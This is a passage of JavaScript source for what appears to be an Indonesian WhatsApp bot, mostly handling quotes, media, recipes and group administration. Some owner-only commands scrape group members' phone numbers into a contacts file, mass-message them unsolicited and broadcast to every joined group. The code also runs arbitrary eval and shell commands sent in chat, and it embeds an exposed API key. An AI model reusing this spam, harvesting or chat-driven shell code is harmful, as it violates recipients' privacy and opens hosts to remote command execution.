reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case "asupan": case "bocil": case "geayubi": case "kayes": case "notnot": case "rikagusriani": case "santuy": case "ukhty": {
reply(mess.wait)
const asup4an = require(`./all/database/asupan/${command}.json`)
const rand4an = asup4an[Math.floor(Math.random() * asup4an.length)]
await basenewkirbotz.sendMessage(from, { video: { url : rand4an }, caption: mess.success }, { quoted : m })
}
break
case "bucin": case "dare": case "faktaunix": case "fml": case "katabijak": case "katacinta": case "katagalau": case "katahacker": case "katailham": case "katasenja": case "katasindiran": case "motivasi": case "nickff": case "pantun": case "puisi": case "quotesislamic": case "quotespubg": case "truth": {
const t3xt = require(`./all/database/text/${command}.json`)
const r4andT3xt = t3xt[Math.floor(Math.random() * t3xt.length)]
basenewkirbotz.sendMessage(from, { text: r4andT3xt }, { quoted: m })
}
break
case "ceritahoror": {
const c3t = JSON.parse(fs.readFileSync("./all/database/text/ceritahoror.json"))
const r4andC3t = c3t[Math.floor(Math.random() * c3t.length)]
const tzt99 = `*CERITA HOROR*

Judul : ${r4andC3t.judul}
Desc : ${r4andC3t.desc}
Story : ${r4andC3t.story}`
basenewkirbotz.sendMessage(from, { image: { url: r4andC3t.thumb }, caption: tzt99 }, { quoted: m })
}
break
case "quotes": {
const qu0 = JSON.parse(fs.readFileSync("./all/database/text/quotes.json"))
const r4ndQu0 = qu0[Math.floor(Math.random() * qu0.length)]
const tyt99 = `*QUOTES RANDOM*

Author : ${r4ndQu0.author}
Quotes : ${r4ndQu0.quotes}`
basenewkirbotz.sendMessage(from, { text: tyt99 }, { quoted: m })
}
break
case "quotesanime": {
const an1 = JSON.parse(fs.readFileSync("./all/database/text/quotesanime.json"))
const r4ndan1 = an1[Math.floor(Math.random() * an1.length)]
const tgt99 = `*QUOTES ANIME RANDOM*

Nama Anime : ${r4ndan1.anime}
Nama Character : ${r4ndan1.character}
Episode : ${r4ndan1.episode}
Quotes : ${r4ndan1.quotes}`
basenewkirbotz.sendMessage(from, { text: tgt99 }, { quoted: m })
}
break
case "happymodsearch": {
if (!text) return reply(`Command Salah Harusnya ${prefix+command} Minecraft\nNote : Awali Dengan Huruf Gede Di Awal Huruf`)
const h4ppy = await happymod(text)
reply(util.format(h4ppy))
}
break
case "stickersearch": {
if (!text) return reply(`Command Salah Harusnya ${prefix+command} loli`)
const st1ck3r = await stickerSearch(text)
reply(util.format(st1ck3r))
}
break
case "cariresep":{
if (!q) return reply(`Contoh ${prefix+command} ayam geprek`)
reply(mess.wait)
let ker = await cariresep(q)
reply(util.format(ker))
}
break
case "bacaresep":{
if (!q) return reply(`Contoh ${prefix+command} https://resepkoki.id/resep/resep-ayam-geprek-keju/`)
reply(mess.wait)
let kir = await bacaresep(q)
let dty = `*BACA RESEP*
Judul : ${kir.judul_nya}
Waktu : ${kir.waktu_nya}
Hasil : ${kir.hasil_nya}
Tingkat Kesulitan : ${kir.tingkat_kesulitan}
Bahan :
${kir.bahan_nya}`
basenewkirbotz.sendMessage(from, { image: { url: kir.thumb_nya }, caption: dty }, { quoted: m })
}
break
case "cekidgc": {
if (!isOwner) return reply(mess.only.owner)
let getGroups = await basenewkirbotz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await basenewkirbotz.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case "pushkontakv1":{
if (!isOwner) return reply(mess.only.owner)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Command Salah Seharusnya Command ${prefix+command} *idgroup|tekspushkontak*\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
reply(mess.wait)
global.idgcns = text.split("|")[0]
global.tekspushkon = text.split("|")[1]
const groupMetadataa = !isGroup? await basenewkirbotz.groupMetadata(global.idgcns).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
if (isContacts) return
for (let mem of halls) {
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await basenewkirbotz.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await basenewkirbotz.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await basenewkirbotz.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
reply(mess.success + ` Kak Jika Mau Save Otomatis Silahkan Ketik ${prefix}savecontact`)
}
break
case "pushkontakv2":{
if (!isOwner) return reply(mess.only.owner)
if (!isGroup) return reply(mess.only.group)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
reply(mess.wait)
global.tekspushkonv2 = text
const groupMetadata = isGroup? await basenewkirbotz.groupMetadata(from).catch(e => {}) : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await basenewkirbotz.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await basenewkirbotz.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(1000)
} else {
await basenewkirbotz.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(1000)
}
}
reply(mess.success + ` Kak Jika Mau Save Otomatis Silahkan Ketik .savecontact`)
}
break
case "savecontact": {
if (!isOwner) return reply(mess.only.owner)
reply(mess.wait)
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA [${index}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await basenewkirbotz.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "share": {
if (!isOwner) return reply(mess.only.owner)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group`)
reply(mess.wait)
let getGroups = await basenewkirbotz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
global.teksjpm = text
for (let xnxx of anu) {
let metadat72 = await basenewkirbotz.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await basenewkirbotz.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await basenewkirbotz.sendMessage(xnxx, { image: { url: mem }, caption: global.teksjpm, contextInfo:{ forwardingScore: 10, isForwarded: true, mentionedJid: participanh.map(a => a.id) } })
await sleep(1000)
} else {
await basenewkirbotz.sendMessage(xnxx, { text: global.teksjpm, contextInfo:{ forwardingScore: 10, isForwarded: true, mentionedJid: participanh.map(a => a.id) } })
await sleep(1000)
}}
reply(mess.sucess)
}
break
case "toptv": {
try {
const msg = await require("baileys").generateWAMessageContent({ video: await m.quoted.download() }, { upload: basenewkirbotz.waUploadToServer })
await basenewkirbotz.relayMessage(from, { ptvMessage: { ...msg.videoMessage } }, {})
} catch (err) {
reply(`Kirim Reply Video Dengan Caption ${prefix + command}`)
}
}
break
case "remini": {
try {
const meks = await basenewkirbotz.downloadAndSaveMediaMessage(quoted)
const mkes = await uptotelegra(meks)
basenewkirbotz.sendMessage(from, { image: { url: `https://api.itsrose.life/image/unblur?url=${mkes}&apikey=f2bbd865809f57b36d1daaa7` }, caption: mess.success }, { quoted: m })
} catch (err) {
reply(util.format(err))
}
}
break
case "tagall":{
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!text) return reply("Teks Nya Mana Kak?")
global.txtag = text
let teks = `\`\`\`「  TAG ALL  」\`\`\`

*Message : ${global.txtag ? global.txtag : "no message"}*\n\n`
for (let mem of pwkdnwn) {
teks += `» @${mem.id.split('@')[0]}\n`
}
basenewkirbotz.sendMessage(from, { text: teks, mentions: pwkdnwn.map(a => a.id) }, { quoted: m })
}
break
case "hidetag": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!text) return reply("Teks Nya Mana Kak?")
global.txhtg = text
basenewkirbotz.sendMessage(from, { text : global.txhtg , mentions: pwkdnwn.map(a => a.id)}, { quoted: m })
}
break
case "add": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await basenewkirbotz.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "kick": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await basenewkirbotz.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "promote": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await basenewkirbotz.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "demote": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await basenewkirbotz.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "group": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] == 'close') {
basenewkirbotz.groupSettingUpdate(from, 'announcement')
reply(`Sukses Mengizinkan Hanya Admin Yang Dapat Mengirim Pesan Ke Grup Ini`)
} else if (args[0] == 'open') {
basenewkirbotz.groupSettingUpdate(from, 'not_announcement')
reply(`Sukses Mengizinkan Semua Peserta Dapat Mengirim Pesan Ke Grup Ini`)
} else {
reply(`Kirim Perintah ${prefix+command} _options_\nOptions : close & open\nContoh : ${prefix+command} close`)
}
}
break
case "revoke":{
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
const lajh = await basenewkirbotz.groupRevokeInvite(from)
reply(`*Succes Ni Kak Link Group New*\nhttps://chat.whatsapp.com/` + lajh)
}
break
case "linkgroup":{
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.only.badmin)
const url = await basenewkirbotz.groupInviteCode(from)
const asu = "https://chat.whatsapp.com/" + url
reply("_Ni Kak Link Group Nya Di Bawah Jangan Lupa Share_\n"+asu)
}
break
case "infogroup":{
if (!m.isGroup) return reply(mess.group)
const url = await basenewkirbotz.groupInviteCode(from)
let teks88 = `\`\`\`「  INFO GROUP  」\`\`\`
▸ Name : ${groupName}
▸ Owner : ${groupOwner !== undefined ? "wa.me/" + groupOwner.split("@")[0] : "Tidak diketahui"}
▸ Creation : ${moment(groupMetadata.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
▸ Total Admins : ${groupAdmins.length}
▸ Total Members : ${pwkdnwn.map((x) => x.id).length}
▸ Link : ${isBotGroupAdmins? `https://chat.whatsapp.com/${url}` : "Botz Is Not Admin"}`
await basenewkirbotz.sendMessage(from, { image: { url: ppgroup }, caption: teks88 }, { quoted: m })
}
break
case "setnamagroup":{
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!text) return reply(`Teks Nya?`)
global.setmg = text
await basenewkirbotz.groupUpdateSubject(m.chat, global.setmg)
reply(`Sukses Mengubah Nama Group Menjadi : ` + global.setmg)
}
break
case "setdescgroup":{
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!text) return reply(`Teks Nya?`)
global.setde = text
await basenewkirbotz.groupUpdateDescription(m.chat, global.setde)
reply(`Sukses Mengganti Deksripsi Group Menjadi : ` + global.setde)
}
break
case "antilink": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] == 'on') {
if (antilink) return reply('*Sudah Aktif*')
antilink = true
reply('*Berhasil Mengaktifkan Antilink*')
} else if (args[0] == 'off') {
if (!antilink) return reply('*Belum Aktif*')
antilink = false
reply('*Berhasil Mematikan Antilink*')
} else {
reply(`Command ${prefix+command} on = Untuk Menyalakan Antilink\nCommand ${prefix+command} off = Untuk Mematikan`)
}
}
break
default:
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
if (budy.startsWith("$")){
if (!isOwner) return reply(mess.only.owner)
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
} catch (e) {
console.log(e)
basenewkirbotz.sendMessage("62877050482351@s.whatsapp.net", {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})